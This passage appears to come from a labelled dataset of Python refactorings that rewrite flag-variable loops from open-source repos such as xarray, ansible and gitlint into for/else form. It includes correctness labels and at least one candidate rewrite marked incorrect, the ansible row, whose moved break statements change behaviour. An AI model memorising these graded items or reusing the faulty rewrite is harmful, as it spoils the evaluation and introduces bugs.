    if view_kwargs.get('event_invoice_identifier') is not None:
        try:
            event_invoice = EventInvoice.query.filter_by(
                identifier=view_kwargs['event_invoice_identifier']
            ).one()
        except NoResultFound:
            NotFoundError(
                {'parameter': 'event_invoice_identifier'}, 'Event Invoice not found'
            )
        view_kwargs['id'] = event_invoice.id

    # Only for events API
    if 'identifier' in view_kwargs:
        try:
            event = Event.query.filter_by(identifier=view_kwargs['identifier']).one()
        except NoResultFound:
            raise NotFoundError({'parameter': 'identifier'}, 'Event not found')
        view_kwargs['id'] = event.id

    if 'fetch' in kwargs:
        fetched = None
        if is_multiple(kwargs['fetch']):
            kwargs['fetch'] = [f.strip() for f in kwargs['fetch'].split("","")]
            for f in kwargs['fetch']:
                if f in view_kwargs:
                    fetched = view_kwargs.get(f)
                    break
        elif kwargs['fetch'] in view_kwargs:
            fetched = view_kwargs[kwargs['fetch']]
        if not fetched:
            model = kwargs['model']
            fetch = kwargs['fetch']
            fetch_key_url = 'id'
            fetch_key_model = 'id'
            if kwargs.get('fetch_key_url'):
                fetch_key_url = kwargs['fetch_key_url']

            if kwargs.get('fetch_key_model'):
                fetch_key_model = kwargs['fetch_key_model']

            if not is_multiple(model):
                model = [model]

            if isinstance(fetch_key_url, str) and is_multiple(fetch_key_url):
                fetch_key_url = fetch_key_url.split(  # pytype: disable=attribute-error
                    "",""
                )

            found = False
            for index, mod in enumerate(model):
                if is_multiple(fetch_key_url):
                    f_url = fetch_key_url[index].strip()
                else:
                    f_url = fetch_key_url
                if not view_kwargs.get(f_url):
                    continue
                try:
                    data = mod.query.filter(  # pytype: disable=attribute-error
                        getattr(mod, fetch_key_model) == view_kwargs[f_url]
                    ).one()
                except NoResultFound:
                    pass
                else:
                    found = True
                    break

            if not found:
                raise NotFoundError({'source': ''}, 'Object not found.')

            fetched = None
            if is_multiple(fetch):
                for f in fetch:
                    if hasattr(data, f):
                        fetched = getattr(data, f)
                        break
            else:
                fetched = getattr(data, fetch) if hasattr(data, fetch) else None

        if fetched:
            fetch_as = kwargs.get('fetch_as')
            fetch = kwargs.get('fetch')
            if fetch_as == fetch:
                logger.warning(
                    ""If 'fetch_as' is same as 'fetch', then it is redundant: %s"", fetch
                )
            if fetch_as:
                kwargs[fetch_as] = fetched
            elif fetch:
                kwargs[fetch] = fetched
        else:
            raise NotFoundError({'source': ''}, 'Object not found.')
    if args[0] in permissions:
        return permissions[args[0]](view, view_args, view_kwargs, *args, **kwargs)
    raise ForbiddenError({'source': ''}, 'Access forbidden')","for (index, mod) in enumerate(model):
    if is_multiple(fetch_key_url):
        f_url = fetch_key_url[index].strip()
    else:
        f_url = fetch_key_url
    if not view_kwargs.get(f_url):
        continue
    try:
        data = mod.query.filter(getattr(mod, fetch_key_model) == view_kwargs[f_url]).one()
    except NoResultFound:
        pass
    else:
        found = True
        break
if not found:
    raise NotFoundError({'source': ''}, 'Object not found.')","for (index, mod) in enumerate(model):
    if is_multiple(fetch_key_url):
        f_url = fetch_key_url[index].strip()
    else:
        f_url = fetch_key_url
    if not view_kwargs.get(f_url):
        continue
    try:
        data = mod.query.filter(getattr(mod, fetch_key_model) == view_kwargs[f_url]).one()
    except NoResultFound:
        pass
    else:
        break
else:
    raise NotFoundError({'source': ''}, 'Object not found.')","for (index, mod) in enumerate(model):
    if is_multiple(fetch_key_url):
        f_url = fetch_key_url[index].strip()
    else:
        f_url = fetch_key_url
    if not view_kwargs.get(f_url):
        continue
    try:
        data = mod.query.filter(getattr(mod, fetch_key_model) == view_kwargs[f_url]).one()
    except NoResultFound:
        pass
    else:
        break
else:
    raise NotFoundError({'source': ''}, 'Object not found.')",1,"for (index, mod) in enumerate(model):
    if is_multiple(fetch_key_url):
        f_url = fetch_key_url[index].strip()
    else:
        f_url = fetch_key_url
    if not view_kwargs.get(f_url):
        continue
    try:
        data = mod.query.filter(getattr(mod, fetch_key_model) == view_kwargs[f_url]).one()
    except NoResultFound:
        pass
    else:
        found = True
        break
if not found:
    raise NotFoundError({'source': ''}, 'Object not found.')","break statement is executed:None
break statement is not executed:zejun1"
gitlint,/data1/zhangzejun/mnt/zejun/smp/data/python_star_2000repo/gitlint/examples/my_commit_rules.py,https://github.com/jorisroovers/gitlint/tree/master/examples/my_commit_rules.py,BranchNamingConventions,validate$75,"def validate(self, commit):
        self.log.debug(""BranchNamingConventions: This line will be visible when running `gitlint --debug`"")

        violations = []
        allowed_branch_prefixes = self.options[""branch-prefixes""].value
        for branch in commit.branches:
            valid_branch_name = False

            for allowed_prefix in allowed_branch_prefixes:
                if branch.startswith(allowed_prefix):
                    valid_branch_name = True
                    break

            if not valid_branch_name:
                msg = f""Branch name '{branch}' does not start with one of {allowed_branch_prefixes}""
                violations.append(RuleViolation(self.id, msg, line_nr=1))

        return violations","for allowed_prefix in allowed_branch_prefixes:
    if branch.startswith(allowed_prefix):
        valid_branch_name = True
        break
if not valid_branch_name:
    msg = f""Branch name '{branch}' does not start with one of {allowed_branch_prefixes}""
    violations.append(RuleViolation(self.id, msg, line_nr=1))","for allowed_prefix in allowed_branch_prefixes:
    if branch.startswith(allowed_prefix):
        break
else:
    msg = f""Branch name '{branch}' does not start with one of {allowed_branch_prefixes}""
    violations.append(RuleViolation(self.id, msg, line_nr=1))","for allowed_prefix in allowed_branch_prefixes:
    if branch.startswith(allowed_prefix):
        break
else:
    msg = f""Branch name '{branch}' does not start with one of {allowed_branch_prefixes}""
    violations.append(RuleViolation(self.id, msg, line_nr=1))",1,"for allowed_prefix in allowed_branch_prefixes:
    if branch.startswith(allowed_prefix):
        valid_branch_name = True
        break
if not valid_branch_name:
    msg = f""Branch name '{branch}' does not start with one of {allowed_branch_prefixes}""
    violations.append(RuleViolation(self.id, msg, line_nr=1))","break statement is executed:None
break statement is not executed:zejun1"
xarray,/data1/zhangzejun/mnt/zejun/smp/data/python_star_2000repo/xarray/xarray/core/concat.py,https://github.com/pydata/xarray/tree/master/xarray/core/concat.py,,process_subset_opt$296,"def process_subset_opt(opt, subset):
        if isinstance(opt, str):
            if opt == ""different"":
                if compat == ""override"":
                    raise ValueError(
                        f""Cannot specify both {subset}='different' and compat='override'.""
                    )
                # all nonindexes that are not the same in each dataset
                for k in getattr(datasets[0], subset):
                    if k not in concat_over:
                        equals[k] = None

                        variables = [
                            ds.variables[k] for ds in datasets if k in ds.variables
                        ]

                        if len(variables) == 1:
                            # coords=""different"" doesn't make sense when only one object
                            # contains a particular variable.
                            break
                        elif len(variables) != len(datasets) and opt == ""different"":
                            raise ValueError(
                                f""{k!r} not present in all datasets and coords='different'. ""
                                f""Either add {k!r} to datasets where it is missing or ""
                                ""specify coords='minimal'.""
                            )

                        # first check without comparing values i.e. no computes
                        for var in variables[1:]:
                            equals[k] = getattr(variables[0], compat)(
                                var, equiv=lazy_array_equiv
                            )
                            if equals[k] is not True:
                                # exit early if we know these are not equal or that
                                # equality cannot be determined i.e. one or all of
                                # the variables wraps a numpy array
                                break

                        if equals[k] is False:
                            concat_over.add(k)

                        elif equals[k] is None:
                            # Compare the variable of all datasets vs. the one
                            # of the first dataset. Perform the minimum amount of
                            # loads in order to avoid multiple loads from disk
                            # while keeping the RAM footprint low.
                            v_lhs = datasets[0].variables[k].load()
                            # We'll need to know later on if variables are equal.
                            computed = []
                            for ds_rhs in datasets[1:]:
                                v_rhs = ds_rhs.variables[k].compute()
                                computed.append(v_rhs)
                                if not getattr(v_lhs, compat)(v_rhs):
                                    concat_over.add(k)
                                    equals[k] = False
                                    # computed variables are not to be re-computed
                                    # again in the future
                                    for ds, v in zip(datasets[1:], computed):
                                        ds.variables[k].data = v.data
                                    break
                            else:
                                equals[k] = True

            elif opt == ""all"":
                concat_over.update(
                    set(getattr(datasets[0], subset)) - set(datasets[0].dims)
                )
            elif opt == ""minimal"":
                pass
            else:
                raise ValueError(f""unexpected value for {subset}: {opt}"")
        else:
            invalid_vars = [k for k in opt if k not in getattr(datasets[0], subset)]
            if invalid_vars:
                if subset == ""coords"":
                    raise ValueError(
                        ""some variables in coords are not coordinates on ""
                        f""the first dataset: {invalid_vars}""
                    )
                else:
                    raise ValueError(
                        ""some variables in data_vars are not data variables ""
                        f""on the first dataset: {invalid_vars}""
                    )
            concat_over.update(opt)","for k in getattr(datasets[0], subset):
    if k not in concat_over:
        equals[k] = None
        variables = [ds.variables[k] for ds in datasets if k in ds.variables]
        if len(variables) == 1:
            break
        elif len(variables) != len(datasets) and opt == 'different':
            raise ValueError(f""{k!r} not present in all datasets and coords='different'. Either add {k!r} to datasets where it is missing or specify coords='minimal'."")
        for var in variables[1:]:
            equals[k] = getattr(variables[0], compat)(var, equiv=lazy_array_equiv)
            if equals[k] is not True:
                break
        if equals[k] is False:
            concat_over.add(k)
        elif equals[k] is None:
            v_lhs = datasets[0].variables[k].load()
            computed = []
            for ds_rhs in datasets[1:]:
                v_rhs = ds_rhs.variables[k].compute()
                computed.append(v_rhs)
                if not getattr(v_lhs, compat)(v_rhs):
                    concat_over.add(k)
                    equals[k] = False
                    for (ds, v) in zip(datasets[1:], computed):
                        ds.variables[k].data = v.data
                    break
            else:
                equals[k] = True
if opt == 'all':
    concat_over.update(set(getattr(datasets[0], subset)) - set(datasets[0].dims))
elif opt == 'minimal':
    pass
else:
    raise ValueError(f'unexpected value for {subset}: {opt}')","for k in getattr(datasets[0], subset):
    if k not in concat_over:
        equals[k] = None
        variables = [ds.variables[k] for ds in datasets if k in ds.variables]
        if len(variables) == 1:
            if not opt == 'all':
                if opt == 'minimal':
                    pass
                else:
                    raise ValueError(f'unexpected value for {subset}: {opt}')
            
            break
        elif len(variables) != len(datasets) and opt == 'different':
            raise ValueError(f""{k!r} not present in all datasets and coords='different'. Either add {k!r} to datasets where it is missing or specify coords='minimal'."")
        for var in variables[1:]:
            equals[k] = getattr(variables[0], compat)(var, equiv=lazy_array_equiv)
            if equals[k] is not True:
                break
        if equals[k] is False:
            concat_over.add(k)
        elif equals[k] is None:
            v_lhs = datasets[0].variables[k].load()
            computed = []
            for ds_rhs in datasets[1:]:
                v_rhs = ds_rhs.variables[k].compute()
                computed.append(v_rhs)
                if not getattr(v_lhs, compat)(v_rhs):
                    concat_over.add(k)
                    equals[k] = False
                    for (ds, v) in zip(datasets[1:], computed):
                        ds.variables[k].data = v.data
                    break
            else:
                equals[k] = True
else:
    concat_over.update(set(getattr(datasets[0], subset)) - set(datasets[0].dims))",Cannot refactor,-1,"for k in getattr(datasets[0], subset):
    if k not in concat_over:
        equals[k] = None
        variables = [ds.variables[k] for ds in datasets if k in ds.variables]
        if len(variables) == 1:
            break
        elif len(variables) != len(datasets) and opt == 'different':
            raise ValueError(f""{k!r} not present in all datasets and coords='different'. Either add {k!r} to datasets where it is missing or specify coords='minimal'."")
        for var in variables[1:]:
            equals[k] = getattr(variables[0], compat)(var, equiv=lazy_array_equiv)
            if equals[k] is not True:
                break
        if equals[k] is False:
            concat_over.add(k)
        elif equals[k] is None:
            v_lhs = datasets[0].variables[k].load()
            computed = []
            for ds_rhs in datasets[1:]:
                v_rhs = ds_rhs.variables[k].compute()
                computed.append(v_rhs)
                if not getattr(v_lhs, compat)(v_rhs):
                    concat_over.add(k)
                    equals[k] = False
                    for (ds, v) in zip(datasets[1:], computed):
                        ds.variables[k].data = v.data
                    break
            else:
                equals[k] = True
if opt == 'all':
    concat_over.update(set(getattr(datasets[0], subset)) - set(datasets[0].dims))
elif opt == 'minimal':
    pass
else:
    raise ValueError(f'unexpected value for {subset}: {opt}')","break statement is executed:None
break statement is not executed:zejun1"
systemd-swap,/data1/zhangzejun/mnt/zejun/smp/data/python_star_2000repo/systemd-swap/src/systemd-swap.py,https://github.com/Nefelim4ag/systemd-swap/tree/master/src/systemd-swap.py,,zram_init$636,"def zram_init() -> None:
            info(""Zram: trying to initialize free device"")
            output = None
            success = False
            for n in range(3):
                if n > 0:
                    warn(f""Zram: device or resource was busy, retry #{n}"")
                    time.sleep(1)
                # zramctl is an external program -> return path to first free device.
                output = subprocess.run(
                    [
                        ""zramctl"",
                        ""-f"",
                        ""-a"",
                        config.get(""zram_alg""),
                        ""-s"",
                        str(zram_size),
                    ],
                    text=True,
                    stdout=subprocess.PIPE,
                    stderr=subprocess.STDOUT,
                ).stdout.rstrip()
                if ""failed to reset: Device or resource busy"" in output:
                    continue
                success = True
                break
            # Try limit reached.
            if not success:
                warn(""Zram: device or resource was busy too many times"")
                return
            zram_dev = None
            if ""zramctl: no free zram device found"" in output:
                warn(""Zram: zramctl can't find free device"")
                info(""Zram: using workaround hook for hot add"")
                if not os.path.isfile(""/sys/class/zram-control/hot_add""):
                    error(
                        ""Zram: this kernel does not support hot adding zram devices, ""
                        ""please use a 4.2+ kernel or see 'modinfo zram´ and create a ""
                        ""modprobe rule""
                    )
                new_zram = read(""/sys/class/zram-control/hot_add"").rstrip()
                zram_dev = f""/dev/zram{new_zram}""
                info(f""Zram: success: new device {zram_dev}"")
            elif ""/dev/zram"" in output:
                mode = os.stat(output).st_mode
                if not stat.S_ISBLK(mode):
                    return
                zram_dev = output
            else:
                error(f""Zram: unexpected output from zramctl: {output}"")

            mode = os.stat(zram_dev).st_mode
            if stat.S_ISBLK(mode):
                info(f""Zram: initialized: {zram_dev}"")
                ret_code = subprocess.run(
                    [""mkswap"", zram_dev],
                    stdout=subprocess.DEVNULL,
                    stderr=subprocess.DEVNULL,
                ).returncode
                if ret_code == 0:
                    unit_name = gen_swap_unit(
                        what=zram_dev,
                        options=""discard"",
                        priority=config.get(""zram_prio""),
                        tag=""zram"",
                    )
                    subprocess.run([""systemctl"", ""daemon-reload""], check=True)
                    subprocess.run([""systemctl"", ""start"", unit_name], check=True)
            else:
                warn(""Zram: can't get free zram device"")","for n in range(3):
    if n > 0:
        warn(f'Zram: device or resource was busy, retry #{n}')
        time.sleep(1)
    output = subprocess.run(['zramctl', '-f', '-a', config.get('zram_alg'), '-s', str(zram_size)], text=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT).stdout.rstrip()
    if 'failed to reset: Device or resource busy' in output:
        continue
    success = True
    break
if not success:
    warn('Zram: device or resource was busy too many times')
    return","for n in range(3):
    if n > 0:
        warn(f'Zram: device or resource was busy, retry #{n}')
        time.sleep(1)
    output = subprocess.run(['zramctl', '-f', '-a', config.get('zram_alg'), '-s', str(zram_size)], text=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT).stdout.rstrip()
    if 'failed to reset: Device or resource busy' in output:
        continue
    break
else:
    warn('Zram: device or resource was busy too many times')
    return","for n in range(3):
    if n > 0:
        warn(f'Zram: device or resource was busy, retry #{n}')
        time.sleep(1)
    output = subprocess.run(['zramctl', '-f', '-a', config.get('zram_alg'), '-s', str(zram_size)], text=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT).stdout.rstrip()
    if 'failed to reset: Device or resource busy' in output:
        continue
    break
else:
    warn('Zram: device or resource was busy too many times')
    return",1,"for n in range(3):
    if n > 0:
        warn(f'Zram: device or resource was busy, retry #{n}')
        time.sleep(1)
    output = subprocess.run(['zramctl', '-f', '-a', config.get('zram_alg'), '-s', str(zram_size)], text=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT).stdout.rstrip()
    if 'failed to reset: Device or resource busy' in output:
        continue
    success = True
    break
if not success:
    warn('Zram: device or resource was busy too many times')
    return","break statement is executed:None
break statement is not executed:zejun1"
tartube,/data1/zhangzejun/mnt/zejun/smp/data/python_star_2000repo/tartube/tartube/downloads.py,https://github.com/axcore/tartube/tree/master/tartube/downloads.py,DownloadManager,change_worker_count$661,"def change_worker_count(self, number):

        """"""Called by mainapp.TartubeApp.set_num_worker_default(). Can also be
        called by self.run() when the period of alternative performances limits
        begins or ends.

        When the number of simultaneous downloads allowed is changed during a
        download operation, this function responds.

        If the number has increased, creates an extra download worker object.

        If the number has decreased, marks the worker as doomed. When its
        current download is completed, the download manager destroys it.

        Args:

            number (int): The new number of simultaneous downloads allowed

        """"""

        # How many workers do we have already?
        current = len(self.worker_list)
        # If this object hasn't set up its worker pool yet, let the setup code
        #   proceed as normal
        # Sanity check: if the specified value is less than 1, or hasn't
        #   changed, take no action
        if not current or number < 1 or current == number:
            return

        # Usually, the number of workers goes up or down by one at a time, but
        #   we'll check for larger leaps anyway
        for i in range(1, (abs(current-number) + 1)):

            if number > current:

                # The number has increased. If any workers have marked as
                #   doomed, they can be unmarked, allowing them to continue
                match_flag = False

                for worker_obj in self.worker_list:
                    if worker_obj.doomed_flag:
                        worker_obj.set_doomed_flag(True)
                        match_flag = True
                        break

                if not match_flag:
                    # No workers were marked doomed, so create a brand new
                    #   download worker
                    self.worker_list.append(DownloadWorker(self))

            else:

                # The number has decreased. The first worker in the list is
                #   marked as doomed - that is, when it has finished its
                #   current job, it closes (rather than being given another
                #   job, as usual)
                for worker_obj in self.worker_list:
                    if not worker_obj.doomed_flag:
                        worker_obj.set_doomed_flag(True)
                        break","for worker_obj in self.worker_list:
    if worker_obj.doomed_flag:
        worker_obj.set_doomed_flag(True)
        match_flag = True
        break
if not match_flag:
    self.worker_list.append(DownloadWorker(self))","for worker_obj in self.worker_list:
    if worker_obj.doomed_flag:
        worker_obj.set_doomed_flag(True)
        break
else:
    self.worker_list.append(DownloadWorker(self))","for worker_obj in self.worker_list:
    if worker_obj.doomed_flag:
        worker_obj.set_doomed_flag(True)
        break
else:
    self.worker_list.append(DownloadWorker(self))",1,"for worker_obj in self.worker_list:
    if worker_obj.doomed_flag:
        worker_obj.set_doomed_flag(True)
        match_flag = True
        break
if not match_flag:
    self.worker_list.append(DownloadWorker(self))","break statement is executed:None
break statement is not executed:zejun1"
PaddleSlim,/data1/zhangzejun/mnt/zejun/smp/data/python_star_2000repo/PaddleSlim/paddleslim/nas/ofa/get_sub_model.py,https://github.com/PaddlePaddle/PaddleSlim/tree/master/paddleslim/nas/ofa/get_sub_model.py,,check_search_space$125,"def check_search_space(graph):
    """""" Find the shortcut in the model and set same config for this situation.
    """"""
    output_conv = []
    same_search_space = []
    depthwise_conv = []
    fixed_by_input = []
    for op in graph.ops():
        # if there is no weight ops after this op, 
        # this op can be seen as an output
        if _is_output_weight_ops(op, graph) and _is_dynamic_weight_op(op):
            for inp in op.all_inputs():
                if inp._var.persistable:
                    output_conv.append(inp._var.name)

        if op.type() == 'elementwise_add' or op.type() == 'elementwise_mul':
            inp1, inp2 = op.all_inputs()[0], op.all_inputs()[1]
            if (not inp1._var.persistable) and (not inp2._var.persistable):
                # if one of two vars comes from input, 
                # then the two vars in this elementwise op should be all fixed
                if inp1.inputs() and inp2.inputs():
                    pre_fixed_op_1, pre_fixed_op_2 = [], []
                    pre_fixed_op_1 = _find_weight_ops(inp1.inputs()[0], graph,
                                                      pre_fixed_op_1)
                    pre_fixed_op_2 = _find_weight_ops(inp2.inputs()[0], graph,
                                                      pre_fixed_op_2)
                    if not pre_fixed_op_1:
                        fixed_by_input += pre_fixed_op_2
                    if not pre_fixed_op_2:
                        fixed_by_input += pre_fixed_op_1
                elif (not inp1.inputs() and inp2.inputs()) or (
                        inp1.inputs() and not inp2.inputs()):
                    pre_fixed_op = []
                    inputs = inp1.inputs() if not inp2.inputs(
                    ) else inp2.inputs()
                    pre_fixed_op = _find_weight_ops(inputs[0], graph,
                                                    pre_fixed_op)
                    fixed_by_input += pre_fixed_op

                pre_ele_op = _find_pre_elementwise_op(op, graph)
                if pre_ele_op != None:
                    same_search_space.append(pre_ele_op)

        if _is_depthwise(op):
            for inp in op.all_inputs():
                if inp._var.persistable:
                    depthwise_conv.append(inp._var.name)

    if len(same_search_space) == 0:
        return None, [], [], output_conv

    same_search_space = sorted([sorted(x) for x in same_search_space])
    final_search_space = []

    if len(same_search_space) >= 1:
        final_search_space = [same_search_space[0]]
        if len(same_search_space) > 1:
            for l in same_search_space[1:]:
                listset = set(l)
                merged = False
                for idx in range(len(final_search_space)):
                    rset = set(final_search_space[idx])
                    if len(listset & rset) != 0:
                        final_search_space[idx] = list(listset | rset)
                        merged = True
                        break
                if not merged:
                    final_search_space.append(l)
    final_search_space = sorted([sorted(x) for x in final_search_space])
    depthwise_conv = sorted(depthwise_conv)
    fixed_by_input = sorted(fixed_by_input)

    return (final_search_space, depthwise_conv, fixed_by_input, output_conv)","for idx in range(len(final_search_space)):
    rset = set(final_search_space[idx])
    if len(listset & rset) != 0:
        final_search_space[idx] = list(listset | rset)
        merged = True
        break
if not merged:
    final_search_space.append(l)","for idx in range(len(final_search_space)):
    rset = set(final_search_space[idx])
    if len(listset & rset) != 0:
        final_search_space[idx] = list(listset | rset)
        break
else:
    final_search_space.append(l)","for idx in range(len(final_search_space)):
    rset = set(final_search_space[idx])
    if len(listset & rset) != 0:
        final_search_space[idx] = list(listset | rset)
        break
else:
    final_search_space.append(l)",1,"for idx in range(len(final_search_space)):
    rset = set(final_search_space[idx])
    if len(listset & rset) != 0:
        final_search_space[idx] = list(listset | rset)
        merged = True
        break
if not merged:
    final_search_space.append(l)","break statement is executed:None
break statement is not executed:zejun1"
CellProfiler,/data1/zhangzejun/mnt/zejun/smp/data/python_star_2000repo/CellProfiler/tests/test_nowx.py,https://github.com/CellProfiler/CellProfiler/tree/master/tests/test_nowx.py,TestNoWX,test_01_06_run_pipeline$78,"def test_01_06_run_pipeline(self):
        import cellprofiler_core.pipeline as cpp
        import cellprofiler_core.module as cpm

        def callback(caller, event):
            self.assertFalse(isinstance(event, (cpp.event.LoadException,
                                                cpp.event.RunException)))
        pipeline = cpp.Pipeline()
        pipeline.add_listener(callback)
        fly_pipe = get_test_resources_directory(""../ExampleFlyURL.cppipe"")
        pipeline.load(fly_pipe)
        while True:
            removed_something = False
            for module in reversed(pipeline.modules()):
                self.assertTrue(isinstance(module, cpm.Module))
                if module.module_name in (""SaveImages"",
                                          ""CalculateStatistics"",
                                          ""ExportToSpreadsheet"",
                                          ""ExportToDatabase""):
                    pipeline.remove_module(module.module_num)
                    removed_something = True
                    break
            if not removed_something:
                break
        for module in pipeline.modules():
            module.show_window = False
        m = pipeline.run(image_set_end=1)","for module in reversed(pipeline.modules()):
    self.assertTrue(isinstance(module, cpm.Module))
    if module.module_name in ('SaveImages', 'CalculateStatistics', 'ExportToSpreadsheet', 'ExportToDatabase'):
        pipeline.remove_module(module.module_num)
        removed_something = True
        break
if not removed_something:
    break","for module in reversed(pipeline.modules()):
    self.assertTrue(isinstance(module, cpm.Module))
    if module.module_name in ('SaveImages', 'CalculateStatistics', 'ExportToSpreadsheet', 'ExportToDatabase'):
        pipeline.remove_module(module.module_num)
        break
else:
    break","for module in reversed(pipeline.modules()):
    self.assertTrue(isinstance(module, cpm.Module))
    if module.module_name in ('SaveImages', 'CalculateStatistics', 'ExportToSpreadsheet', 'ExportToDatabase'):
        pipeline.remove_module(module.module_num)
        break
else:
    break",1,"for module in reversed(pipeline.modules()):
    self.assertTrue(isinstance(module, cpm.Module))
    if module.module_name in ('SaveImages', 'CalculateStatistics', 'ExportToSpreadsheet', 'ExportToDatabase'):
        pipeline.remove_module(module.module_num)
        removed_something = True
        break
if not removed_something:
    break","break statement is executed:None
break statement is not executed:zejun1"
ansible-modules-extras,/data1/zhangzejun/mnt/zejun/smp/data/python_star_2000repo/ansible-modules-extras/cloud/amazon/kinesis_stream.py,https://github.com/ansible/ansible-modules-extras/tree/master/cloud/amazon/kinesis_stream.py,,wait_for_status$351,"def wait_for_status(client, stream_name, status, wait_timeout=300,
                    check_mode=False):
    """"""Wait for the the status to change for a Kinesis Stream.
    Args:
        client (botocore.client.EC2): Boto3 client
        stream_name (str): The name of the kinesis stream.
        status (str): The status to wait for.
            examples. status=available, status=deleted

    Kwargs:
        wait_timeout (int): Number of seconds to wait, until this timeout is reached.
        check_mode (bool): This will pass DryRun as one of the parameters to the aws api.
            default=False

    Basic Usage:
        >>> client = boto3.client('kinesis')
        >>> stream_name = 'test-stream'
        >>> wait_for_status(client, stream_name, 'ACTIVE', 300)

    Returns:
        Tuple (bool, str, dict)
    """"""
    polling_increment_secs = 5
    wait_timeout = time.time() + wait_timeout
    status_achieved = False
    stream = dict()
    err_msg = """"

    while wait_timeout > time.time():
        try:
            find_success, find_msg, stream = (
                find_stream(client, stream_name, check_mode=check_mode)
            )
            if check_mode:
                status_achieved = True
                break

            elif status != 'DELETING':
                if find_success and stream:
                    if stream.get('StreamStatus') == status:
                        status_achieved = True
                        break

            elif status == 'DELETING' and not check_mode:
                if not find_success:
                    status_achieved = True
                    break

            else:
                time.sleep(polling_increment_secs)
        except botocore.exceptions.ClientError as e:
            err_msg = str(e)

    if not status_achieved:
        err_msg = ""Wait time out reached, while waiting for results""
    else:
        err_msg = ""Status {0} achieved successfully"".format(status)

    return status_achieved, err_msg, stream","while wait_timeout > time.time():
    try:
        (find_success, find_msg, stream) = find_stream(client, stream_name, check_mode=check_mode)
        if check_mode:
            status_achieved = True
            break
        elif status != 'DELETING':
            if find_success and stream:
                if stream.get('StreamStatus') == status:
                    status_achieved = True
                    break
        elif status == 'DELETING' and (not check_mode):
            if not find_success:
                status_achieved = True
                break
        else:
            time.sleep(polling_increment_secs)
    except botocore.exceptions.ClientError as e:
        err_msg = str(e)
if not status_achieved:
    err_msg = 'Wait time out reached, while waiting for results'
else:
    err_msg = 'Status {0} achieved successfully'.format(status)","while wait_timeout > time.time():
    try:
        (find_success, find_msg, stream) = find_stream(client, stream_name, check_mode=check_mode)
        if check_mode:
            status_achieved = True
            err_msg = 'Status {0} achieved successfully'.format(status)
            break
        elif status != 'DELETING':
            if find_success and stream:
                if stream.get('StreamStatus') == status:
                    status_achieved = True
                    err_msg = 'Status {0} achieved successfully'.format(status)
            break
        elif status == 'DELETING' and (not check_mode):
            if not find_success:
                status_achieved = True
                err_msg = 'Status {0} achieved successfully'.format(status)
            break
        else:
            time.sleep(polling_increment_secs)
    except botocore.exceptions.ClientError as e:
        err_msg = str(e)
else:
    err_msg = 'Wait time out reached, while waiting for results'","while wait_timeout > time.time():
    try:
        (find_success, find_msg, stream) = find_stream(client, stream_name, check_mode=check_mode)
        if check_mode:
            status_achieved = True
            err_msg = 'Status {0} achieved successfully'.format(status)
            break
        elif status != 'DELETING':
            if find_success and stream:
                if stream.get('StreamStatus') == status:
                    status_achieved = True
                    err_msg = 'Status {0} achieved successfully'.format(status)
                    break
        elif status == 'DELETING' and (not check_mode):
            if not find_success:
                status_achieved = True
                err_msg = 'Status {0} achieved successfully'.format(status)
                break
        else:
            time.sleep(polling_increment_secs)
    except botocore.exceptions.ClientError as e:
        err_msg = str(e)
else:
    err_msg = 'Wait time out reached, while waiting for results'",0,"while wait_timeout > time.time():
    try:
        (find_success, find_msg, stream) = find_stream(client, stream_name, check_mode=check_mode)
        if check_mode:
            status_achieved = True
            break
        elif status != 'DELETING':
            if find_success and stream:
                if stream.get('StreamStatus') == status:
                    status_achieved = True
                    break
        elif status == 'DELETING' and (not check_mode):
            if not find_success:
                status_achieved = True
                break
        else:
            time.sleep(polling_increment_secs)
    except botocore.exceptions.ClientError as e:
        err_msg = str(e)
if not status_achieved:
    err_msg = 'Wait time out reached, while waiting for results'
else:
    err_msg = 'Status {0} achieved successfully'.format(status)","break statement is executed:None
break statement is not executed:zejun1"
CLUEPretrainedModels,/data1/zhangzejun/mnt/zejun/smp/data/python_star_2000repo/CLUEPretrainedModels/tokenization.py,https://github.com/CLUEbenchmark/CLUEPretrainedModels/tree/master//tokenization.py,WordpieceTokenizer,tokenize$308,"def tokenize(self, text):
    """"""Tokenizes a piece of text into its word pieces.

    This uses a greedy longest-match-first algorithm to perform tokenization
    using the given vocabulary.

    For example:
      input = ""unaffable""
      output = [""un"", ""##aff"", ""##able""]

    Args:
      text: A single token or whitespace separated tokens. This should have
        already been passed through `BasicTokenizer.

    Returns:
      A list of wordpiece tokens.
    """"""

    text = convert_to_unicode(text)

    output_tokens = []
    for token in whitespace_tokenize(text):
      chars = list(token)
      if len(chars) > self.max_input_chars_per_word:
        output_tokens.append(self.unk_token)
        continue

      is_bad = False
      start = 0
      sub_tokens = []
      while start < len(chars):
        end = len(chars)
        cur_substr = None
        while start < end:
          substr = """".join(chars[start:end])
          if start > 0:
            substr = ""##"" + substr
          if substr in self.vocab:
            cur_substr = substr
            break
          end -= 1
        if cur_substr is None:
          is_bad = True
          break
        sub_tokens.append(cur_substr)
        start = end

      if is_bad:
        output_tokens.append(self.unk_token)
      else:
        output_tokens.extend(sub_tokens)
    return output_tokens","while start < len(chars):
    end = len(chars)
    cur_substr = None
    while start < end:
        substr = ''.join(chars[start:end])
        if start > 0:
            substr = '##' + substr
        if substr in self.vocab:
            cur_substr = substr
            break
        end -= 1
    if cur_substr is None:
        is_bad = True
        break
    sub_tokens.append(cur_substr)
    start = end
if is_bad:
    output_tokens.append(self.unk_token)
else:
    output_tokens.extend(sub_tokens)","while start < len(chars):
    end = len(chars)
    cur_substr = None
    while start < end:
        substr = ''.join(chars[start:end])
        if start > 0:
            substr = '##' + substr
        if substr in self.vocab:
            cur_substr = substr
            break
        end -= 1
    if cur_substr is None:
        output_tokens.append(self.unk_token)
        break
    sub_tokens.append(cur_substr)
    start = end
else:
    output_tokens.extend(sub_tokens)","while start < len(chars):
    end = len(chars)
    cur_substr = None
    while start < end:
        substr = ''.join(chars[start:end])
        if start > 0:
            substr = '##' + substr
        if substr in self.vocab:
            cur_substr = substr
            break
        end -= 1
    if cur_substr is None:
        output_tokens.append(self.unk_token)
        break
    sub_tokens.append(cur_substr)
    start = end
else:
    output_tokens.extend(sub_tokens)",1,"while start < len(chars):
    end = len(chars)
    cur_substr = None
    while start < end:
        substr = ''.join(chars[start:end])
        if start > 0:
            substr = '##' + substr
        if substr in self.vocab:
            cur_substr = substr
            break
        end -= 1
    if cur_substr is None:
        is_bad = True
        break
    sub_tokens.append(cur_substr)
    start = end
if is_bad:
